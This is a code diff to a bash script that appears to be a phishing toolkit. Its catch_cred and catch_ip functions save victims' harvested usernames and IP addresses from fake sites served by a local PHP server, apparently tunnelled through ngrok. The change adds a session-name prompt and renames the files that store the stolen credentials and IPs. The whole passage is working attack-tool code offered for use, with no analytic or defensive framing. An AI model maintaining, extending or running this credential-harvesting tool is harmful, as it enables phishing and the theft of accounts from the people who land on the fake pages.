@@ -363,7 +363,7 @@ catch_cred(){
     mkdir results/$server
   fi
   TIME=$(date +%T)
-  cp sites/$server/saved.usernames.txt -t results/$server/${TIME}.usernames.txt
+  cp sites/$server/saved.usernames.txt results/$server/usernames_${SESHNAME}.${TIME}.txt
   printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m sites/%s/saved.usernames.txt\e[0m\n" $server
   killall -2 php > /dev/null 2>&1
   killall -2 ngrok > /dev/null 2>&1
@@ -398,7 +398,7 @@ catch_ip(){
     mkdir results/$server
   fi
   TIME=$(date +%T)
-  cp sites/$server/saved.ip.txt.txt -t results/$server/${TIME}.ip.txt
+  cp sites/$server/saved.ip.txt.txt results/$server/ip_${SESHNAME}.${TIME}.txt
 
 
   if [[ -e iptracker.log ]]; then
@@ -498,7 +498,8 @@ start(){
   if [[ -e sites/$server/usernames.txt ]]; then
     rm -rf sites/$server/usernames.txt
   fi
-
+  echo "Please enter a name for this session?"
+  read SESHNAME
   printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
   cd sites/$server && php -S 127.0.0.1:3333 > /dev/null 2>&1 &
   sleep 2
